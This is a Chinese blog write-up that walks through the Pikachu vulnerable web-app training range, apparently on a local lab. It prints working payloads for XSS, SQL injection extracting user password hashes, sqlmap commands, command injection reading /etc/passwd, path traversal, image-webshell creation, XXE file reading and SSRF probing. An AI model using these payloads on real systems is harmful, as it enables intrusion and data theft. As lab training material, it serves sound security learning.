---
cover: /images/pikachu.png
title: Pikachu 靶场通关笔记
categories:
  - 靶场
tags:
  - 靶场
  - Pikachu
  - XSS
  - SQL注入
  - CSRF
abbrlink: 31fdd992
date: 2026-03-05 12:00:00# 🐾 Pikachu 靶场通关笔记

> 📌 本文记录 Pikachu 靶场各类 Web 漏洞的实战练习过程，涵盖 XSS、CSRF、SQL注入、文件操作、越权、序列化、XXE、SSRF 等常见漏洞类型。
>
> https://www.cnblogs.com/wrold/p/19670125

---

## 📚 目录

- [一、XSS 跨站脚本攻击](#一xss-跨站脚本攻击)
  - [1.1 反射型 XSS（DOM型）](#11-反射型-xssdom型)
  - [1.2 DOM型 XSS-x](#12-dom型-xss-x)
  - [1.3 XSS 盲打](#13-xss-盲打)
  - [1.4 XSS 之过滤绕过](#14-xss-之过滤绕过)
  - [1.5 XSS 之 htmlspecialchars](#15-xss-之-htmlspecialchars)
  - [1.6 XSS 之 href 输出](#16-xss-之-href-输出)
  - [1.7 XSS 之 JS 输出](#17-xss-之-js-输出)
- [二、CSRF 跨站请求伪造](#二csrf-跨站请求伪造)
  - [2.1 CSRF（GET）](#21-csrfget)
  - [2.2 CSRF（POST）](#22-csrfpost)
  - [2.3 CSRF Token](#23-csrf-token)
- [三、SQL 注入](#三sql-注入)
  - [3.1 数字型注入](#31-数字型注入)
  - [3.2 字符型注入](#32-字符型注入)
  - [3.3 搜索型注入](#33-搜索型注入)
  - [3.4 X 型注入](#34-x-型注入)
  - [3.5 INSERT / UPDATE 注入](#35-insert--update-注入)
  - [3.6 DELETE 注入](#36-delete-注入)
  - [3.7 HTTP 头注入](#37-http-头注入)
  - [3.8 基于 Boolean 的盲注](#38-基于-boolean-的盲注)
  - [3.9 基于时间的盲注](#39-基于时间的盲注)
  - [3.10 宽字节注入（Wide Byte）](#310-宽字节注入wide-byte)
- [四、RCE 远程代码执行](#四rce-远程代码执行)
  - [4.1 exec "ping"](#41-exec-ping)
  - [4.2 exec "eval"](#42-exec-eval)
- [五、文件操作漏洞](#五文件操作漏洞)
  - [5.1 本地文件包含（LFI）](#51-本地文件包含lfi)
  - [5.2 远程文件包含（RFI）](#52-远程文件包含rfi)
  - [5.3 不安全的文件下载](#53-不安全的文件下载)
  - [5.4 文件上传 — 客户端校验绕过](#54-文件上传--客户端校验绕过)
  - [5.5 文件上传 — 服务端校验绕过](#55-文件上传--服务端校验绕过)
- [六、越权漏洞](#六越权漏洞)
  - [6.1 水平越权](#61-水平越权)
  - [6.2 垂直越权](#62-垂直越权)
- [七、目录遍历](#七目录遍历)
- [八、敏感信息泄露](#八敏感信息泄露)
- [九、PHP 反序列化漏洞](#九php-反序列化漏洞)
- [十、XXE 漏洞](#十xxe-漏洞)
- [十一、不安全的 URL 跳转](#十一不安全的-url-跳转)
- [十二、SSRF 服务端请求伪造](#十二ssrf-服务端请求伪造)
  - [12.1 SSRF（curl）](#121-ssrfcurl)
  - [12.2 SSRF（file_get_contents）](#122-ssrffile_get_contents)

---

## 一、XSS 跨站脚本攻击

> 🔥 XSS（Cross-Site Scripting）是指攻击者将恶意脚本注入到网页中，使其他用户在浏览时执行该脚本，从而窃取 Cookie、劫持会话等。

---

### 1.1 反射型 XSS（DOM型）

**🔍 思路：** 随便输入内容并查看页面源代码，定位到按钮触发的 JS 函数。

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image1.png)

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image2.png)

找到按钮所绑定的函数后：

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image3.png)

发现参数被拼接到 `<a>` 标签中，可以利用单引号闭合属性来注入事件。

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image4.png)

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image5.png)

> ⚠️ 注意：一定要使用**英文单引号**，中文单引号无效！

**💣 Payload：**

```
' onclick=eval("alert('xss');">xss</a>
```

只需构造闭合，再点击 "xss" 链接：

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image6.png)

成功触发弹窗 🎉

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image7.png)

---

### 1.2 DOM型 XSS-x

**🔍 思路：** 与上一题类似，Payload 相同，但本题还支持通过 URL 参数提交（需手动点击一下触发）。

**💣 Payload（URL 提交）：**

```
?text=%27%20onclick=eval("alert(%27xss%27);">xss</a>#
```

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image8.png)

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image9.png)

---

### 1.3 XSS 盲打

**📖 概念：** 盲打就是注入后在当前页面看不到效果，但 Payload 会在后台管理员查看时触发。

**🔍 步骤：**

1. 在前台随意输入内容提交（包含 XSS Payload）

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image10.png)

2. 登录后台查看留言

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image11.png)

3. 后台页面触发弹窗 💥

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image12.png)

4. 查看源代码，可以看到之前写入的 XSS 代码已被执行

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image13.png)

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image14.png)

---

### 1.4 XSS 之过滤绕过

**📖 概念：** 服务端对脚本标签进行了简单的关键字过滤，但过滤规则不完整，可通过大小写混用绕过。

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image15.png)

**💣 Payload（大小写混用绕过）：**

```html
<sCript>alert(1)</sCript>
```

成功执行 ✅

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image16.png)

---

### 1.5 XSS 之 htmlspecialchars

**📖 概念：** `htmlspecialchars` 是 PHP 中常见的 XSS 防御函数，可将特殊字符转义为 HTML 实体。但它存在以下几种绕过场景：

| 场景 | 说明 |
|------|------|
| ① 用在 `href` 属性里 | `javascript:alert(1)` 不含特殊字符，不会被转义 |
| ② 未加 `ENT_QUOTES` 参数 | 单引号不会被转义，可用于闭合属性 |
| ③ 输出在 JS 代码块中 | 保护不完整，可通过字符串闭合绕过 |

**🔍 步骤：** 输入代码没有反应，查看源代码发现输入被放入了 `<a>` 标签的属性中。

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image17.png)

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image18.png)

发现是 `<a>` 标签中的单引号闭合问题，构造绕过：

**💣 Payload：**

```
' onclick=alert(1111) '
```

成功触发 🎉

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image19.png)

---

### 1.6 XSS 之 href 输出

**🔍 思路：** 查看源代码发现尖括号已被编码转义，无法直接插入标签。
可以使用不含尖括号的方案：

**💣 Payload 一（属性事件注入）：**

```
' onclick=alert(1111) '
```

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image20.png)

**💣 Payload 二（javascript 伪协议）：**

```
javascript:alert(1)
```

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image21.png)

两种方式均可成功执行 ✅

---

### 1.7 XSS 之 JS 输出

**📖 概念：** 用户输入被直接拼接到 JS 代码块中，需要闭合 JS 字符串才能注入恶意代码。

尝试直接插入 `<script>` 标签，发现 JS 语法被破坏，不能正常执行：

```html
<scirpt>alert('xss')</script>
```

查看源代码后，构造闭合注入：

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image22.png)

**💣 Payload 一（闭合字符串）：**

```
';alert(1)//
```

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image23.png)

**💣 Payload 二（标签闭合绕过）：**

```html
</script><script>alert('xss')</script>
```

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image24.png)

两种方式均可成功触发 ✅

---

## 二、CSRF 跨站请求伪造

> 🎭 CSRF（Cross-Site Request Forgery）是指攻击者诱使已登录用户访问恶意页面，在用户不知情的情况下以其身份发起请求，篡改数据。

---

### 2.1 CSRF（GET）

**🔍 步骤：**

1. 登录一个普通用户账号

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image25.png)

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image26.png)

2. 尝试修改个人信息，用 Burp Suite 抓包观察请求

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image27.png)

3. 发现是 **GET 方式**发送的请求

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image28.png)

4. 在 Burp 中右键 → 生成 CSRF PoC

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image29.png)

5. 修改 PoC 中的目标参数后复制链接

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image30.png)

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image31.png)

6. 访问构造好的链接后，发现用户信息已被悄悄修改 ✅

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image32.png)

---

### 2.2 CSRF（POST）

**📖 概念：** 与 GET 型 CSRF 原理相同，区别在于请求使用 POST 方式发送，需要构造一个隐藏表单页面自动提交。

---

### 2.3 CSRF Token

**📖 概念：** 添加了随机 Token 验证，理论上无法直接伪造请求。

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image33.png)

**🔍 查看源代码：** 发现 Token 存储在前端 HTML 中

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image34.png)

> 💡 **绕过思路：** 此处可配合 **XSS 漏洞**，先通过 XSS 读取页面中的 Token 值，再携带 Token 构造 CSRF 请求，实现完整攻击链：`XSS + CSRF`。

---

## 三、SQL 注入

> 💉 SQL 注入是指攻击者将恶意 SQL 语句插入到输入参数中，操控后端数据库执行非预期的查询。

---

### 3.1 数字型注入

**🔍 步骤：**

1. 输入数字，页面正常显示

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image35.png)

2. 输入单引号 `'`，页面报错 → 确认存在注入点

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image36.png)

3. 使用 `ORDER BY` 探测列数，到 `2` 不报错，说明有 **2 列输出**

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image37.png)

4. 使用联合注入查询数据库信息

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image38.png)

**💣 查表名：**

```sql
id=2 union select group_concat(table_name),2 from information_schema.tables where table_schema='pikachu'
```

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image39.png)

**💣 查列名：**

```sql
id=2 union select group_concat(column_name),2 from information_schema.columns where table_schema='pikachu' and table_name='users'
```

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image40.png)

**💣 查数据：**

```sql
id=2 union select group_concat(username),group_concat(password) from users
```

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image41.png)

5. 密码经过 MD5 加密，使用在线工具解密：[https://www.cmd5.com/](https://www.cmd5.com/)

```
e10adc3949ba59abbe56e057f20f883e → 123456
670b14728ad9902aecba32e22fa4f6bd → 123456
e99a18c428cb38d5f260853678922e03 → abc123
```

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image42.png)

---

### 3.2 字符型注入

**🔍 思路：** 参数被单引号包裹，需要用 `'` 闭合原有引号再注入。

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image43.png)

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image44.png)

**💣 Payload：**

```sql
1' union select group_concat(table_name),2 from information_schema.tables where table_schema=database() #
```

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image45.png)

---

### 3.3 搜索型注入

**📖 概念：** 后端 SQL 使用 `LIKE '%$name%'` 进行模糊查询，存在注入风险。

使用 SQLMap 自动检测：

```bash
python sqlmap.py -u "http://pikachu/vul/sqli/sqli_search.php?name=1&submit=%E6%90%9C%E7%B4%A2" --batch
```

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image46.png)

---

### 3.4 X 型注入

**📖 概念：** SQL 语句结构为 `SELECT * FROM users WHERE (id='$id')`，参数被括号和引号包裹。

```bash
python sqlmap.py -u "http://pikachu/vul/sqli/sqli_x.php?name=1&submit=%E6%9F%A5%E8%AF%A2" --batch
```

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image47.png)

---

### 3.5 INSERT / UPDATE 注入

**🔍 思路：** 注入点位于 INSERT 或 UPDATE 语句中，建议将请求包保存为文件，再用 SQLMap 发包。

```bash
python sqlmap.py -r D:\Backup\桌面\sql.txt --batch
```

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image48.png)

---

### 3.6 DELETE 注入

**🔍 思路：** 注入点位于 DELETE 语句中，通常通过 ID 参数传入。

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image49.png)

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image50.png)

```bash
# 使用 SQLMap 检测
python sqlmap.py -r sql.txt --batch
```

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image51.png)

---

### 3.7 HTTP 头注入

**📖 概念：** 注入点不在 URL 参数中，而是在 HTTP 请求头（如 `User-Agent`、`X-Forwarded-For`、`Cookie` 等）。

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image52.png)

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image53.png)

> ⚠️ 注意识别正确的包，登录包不是目标，要找**带有 UA 信息的业务包**。

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image54.png)

这个才是目标包 👇

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image55.png)

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image56.png)

这是**报错注入**类型：

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image57.png)

---

### 3.8 基于 Boolean 的盲注

**📖 概念：** 页面不返回具体数据，只通过 True/False 的响应差异来逐位猜解数据。

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image58.png)

```bash
python sqlmap.py -u "目标URL" --batch
```

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image59.png)

---

### 3.9 基于时间的盲注

**📖 概念：** 注入后通过 `sleep()` 函数造成响应延迟，根据响应时间判断条件真假，逐步提取数据。

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image60.png)

```bash
python sqlmap.py -u "目标URL" --batch
```

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image61.png)

---

### 3.10 宽字节注入（Wide Byte）

**📖 概念：** 宽字节注入是针对**字符编码过滤**的绕过技术。当后端使用 GBK/GB2312 编码且对单引号用 `\` 转义时，通过在单引号前插入 `%df`，使 `%df\` 被合并解析为一个合法的 GBK 汉字，从而"吃掉"反斜杠，让单引号逃逸。

**💣 Payload：**

```
name=1%df' union select version(),database() #
```

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image62.png)

---

## 四、RCE 远程代码执行

> ⚡ RCE（Remote Code Execution）是危害最高的漏洞类型之一，攻击者可直接在服务器上执行任意命令或代码。

---

### 4.1 exec "ping"

**📖 概念：** 该功能通过系统调用执行 `ping` 命令，可利用**管道符**拼接执行额外命令。

**💣 管道命令注入示例：**

```bash
127.0.0.1 | whoami
127.0.0.1 | cat /etc/passwd
```

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image63.png)

---

### 4.2 exec "eval"

**📖 概念：** 该功能直接 `eval()` 执行用户输入的 PHP 代码，危害极大。

**💣 Payload：**

```php
phpinfo();
```

直接执行，页面返回完整 phpinfo 信息 ✅

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image64.png)

---

## 五、文件操作漏洞

---

### 5.1 本地文件包含（LFI）

**📖 概念：** 服务端通过 `include()` 等函数动态加载文件，若参数可控且未过滤路径穿越符，攻击者可读取任意文件。

**🔍 观察 URL 参数：**

```
http://pikachu/vul/fileinclude/fi_local.php?filename=file5.php&submit=提交
```

**💣 构造路径穿越：**

```
http://pikachu/vul/fileinclude/fi_local.php?filename=../../../../../../1.php&submit=提交
```

预先在目标路径写入如下文件 `1.php`：

```php
<?php phpinfo(); ?>
```

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image65.png)

---

### 5.2 远程文件包含（RFI）

**📖 概念：** 若服务端 PHP 配置开启了 `allow_url_include`，可以包含远程 URL 指向的恶意文件。

**💣 Payload：**

```
http://pikachu/vul/fileinclude/fi_remote.php?filename=http://baidu.com&submit=提交
```

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image66.png)

> 💡 实战中可将 `filename` 参数指向包含 Webshell 的远程服务器，获取权限。

---

### 5.3 不安全的文件下载

**📖 概念：** 文件下载接口的 `filename` 参数未过滤，可通过路径穿越读取任意文件。

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image67.png)

**💣 构造路径穿越下载源码：**

```
unsafedownload/execdownload.php?filename=../../../index.php
```

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image68.png)

---

### 5.4 文件上传 — 客户端校验绕过

**📖 概念：** 文件类型校验仅在前端 JavaScript 中完成，禁用 JS 即可绕过。

**🔍 查看源代码，确认是前端检测：**

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image69.png)

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image70.png)

**🔍 步骤：**

1. 在浏览器中禁用 JavaScript

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image71.png)

2. 再次上传 `.php` 文件，已无校验限制

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image72.png)

3. 访问上传路径，执行成功 ✅

```
http://pikachu/vul/unsafeupload/uploads/1.php
```

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image73.png)

---

### 5.5 文件上传 — 服务端校验绕过

#### MIME 类型检测绕过

**📖 概念：** 服务端检测 `Content-Type` 字段，在 Burp Suite 中将其修改为 `image/png` 即可绕过。

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image74.png)

#### getimagesize() 图片头检测绕过

**📖 概念：** `getimagesize()` 通过读取文件头来判断是否是合法图片，可制作**图片马**（在图片文件末尾附加 PHP 代码）来绕过。

```bash
# 制作图片马
copy normal.png /b + shell.php /a webshell.png
```

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image75.png)

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image76.png)

> ⚠️ 注意：上传后文件后缀为 `.png`，无法直接用工具连接 Webshell。需结合**文件包含漏洞**，通过包含图片马来触发执行。

---

## 六、越权漏洞

> 🔑 越权漏洞是指用户能够访问或操作超出其权限范围的数据或功能。

---

### 6.1 水平越权

**📖 概念：** 同等权限的用户间互相访问对方数据。（如用户A能查看用户B的信息）

**🔍 步骤：**

1. 登录账号，查看个人信息

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image77.png)

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image78.png)

2. 观察 URL 参数：

```
http://pikachu/vul/overpermission/op1/op1_mem.php?username=lucy&submit=点击查看个人信息
```

3. 直接修改 `username` 参数为其他用户名，即可越权访问 ✅

```
http://pikachu/vul/overpermission/op1/op1_mem.php?username=lili&submit=点击查看个人信息
```

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image79.png)

---

### 6.2 垂直越权

**📖 概念：** 低权限用户访问高权限用户才能使用的功能。（如普通用户访问管理员接口）

**🔍 步骤：**

1. 分别登录普通用户 `pikachu` 和管理员 `Admin`，对比页面差异

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image80.png)

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image81.png)

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image82.png)

2. 管理员点击"添加用户"时，URL 为：

```
http://pikachu/vul/overpermission/op2/op2_admin_edit.php
```

3. 切换回 `pikachu` 普通用户的 Cookie，直接访问该 URL，成功操作管理员功能 ✅

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image83.png)

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image84.png)

---

## 七、目录遍历

**📖 概念：** 服务端接受用户控制的文件路径参数，未作充分限制，攻击者可通过 `../` 跨越目录访问任意文件。

**🔍 观察 URL：**

```
http://pikachu/vul/dir/dir_list.php?title=jarheads.php
```

**💣 构造路径穿越：**

```
http://pikachu/vul/dir/dir_list.php?title=../../../../../../1.php
```

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image85.png)

---

## 八、敏感信息泄露

**📖 概念：** 应用程序无意间将敏感信息暴露在前端页面（如 HTML 注释、JS 文件、报错信息等）。

**🔍 直接查看页面源代码即可发现：**

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image86.png)

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image87.png)

---

## 九、PHP 反序列化漏洞

**📖 概念：** 当反序列化的内容可被用户控制，且后端使用了危险的魔法函数时，就会产生安全漏洞。

### 相关函数

| 函数 | 说明 |
|------|------|
| `serialize()` | 将对象转换为可传输字符串 |
| `unserialize()` | 将字符串还原为对象 |

**序列化示例：**

```php
class S {
    public $test = "pikachu";
}
$s = new S();
serialize($s);
// 输出：O:1:"S":1:{s:4:"test";s:7:"pikachu";}
```

**格式解析：**

```
O:1:"S":1:{s:4:"test";s:7:"pikachu";}
│ │   │  │   │    │       │    │
│ │   │  │   │    │       │    └─ 变量值
│ │   │  │   │    │       └─ 变量值长度
│ │   │  │   │    └─ 变量名
│ │   │  │   └─ 变量名长度
│ │   │  └─ 变量数量
│ │   └─ 对象名称
│ └─ 对象名长度
└─ Object
```

### 常见魔法函数

| 魔法函数 | 触发时机 |
|----------|----------|
| `__construct()` | 对象创建时 |
| `__destruct()` | 对象销毁时 |
| `__toString()` | 对象被当作字符串使用时 |
| `__sleep()` | 序列化之前 |
| `__wakeup()` | 反序列化之后立即调用 |

### 漏洞利用示例

```php
class S {
    var $test = "pikachu";
    function __destruct() {
        echo $this->test;  // 对象销毁时会执行
    }
}
$s = $_GET['test'];
@$unser = unserialize($a);
```

**💣 Payload 构造脚本：**

```php
<?php
class S {
    var $test = "<script>alert(111)</script>";
}
$a = new S();
echo serialize($a);
?>
```

**💣 输出 Payload：**

```
O:1:"S":1:{s:4:"test";s:27:"<script>alert(111)</script>";}
```

提交后成功触发 XSS ✅

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image88.png)

---

## 十、XXE 漏洞

**📖 概念：** XXE（XML External Entity）即 XML 外部实体注入，攻击者通过构造恶意 XML 文档，利用外部实体读取服务器文件或发起 SSRF 攻击。

**💣 Payload（读取 Windows 系统文件）：**

```xml
<?xml version="1.0"?>
<!DOCTYPE ANY [
    <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<a>&xxe;</a>
```

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image89.png)

---

## 十一、不安全的 URL 跳转

**📖 概念：** 应用程序使用用户可控的参数作为跳转目标 URL，可被用于钓鱼攻击（将用户引导至恶意站点）。

**💣 构造恶意跳转：**

```
http://pikachu/vul/urlredirect/urlredirect.php?url=http://baidu.com
```

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image90.png)

---

## 十二、SSRF 服务端请求伪造

> 🌐 SSRF（Server-Side Request Forgery）是指攻击者构造请求，由**服务器**代为发起，可访问内网资源、绕过防火墙。

> ⚠️ 以下两个 SSRF 题目需要 **PHP 7** 版本才能正常运行。

---

### 12.1 SSRF（curl）

**💣 利用 curl 访问内网资源：**

```
http://pikachu/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/1.php
```

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image91.png)

---

### 12.2 SSRF（file_get_contents）

**💣 利用 file_get_contents 访问内网资源：**

```
http://pikachu/vul/ssrf/ssrf_fgc.php?file=http://127.0.0.1/1.php
```

同样有效 ✅，还支持其他伪协议玩法，例如：

```
file:///etc/passwd        # 读取本地文件
dict://127.0.0.1:6379/    # 探测内网服务
```

---

> 📝 **笔记说明：** 本文档基于 Pikachu 靶场实战整理，所有操作均在本地搭建的靶场环境中完成，仅用于学习交流。

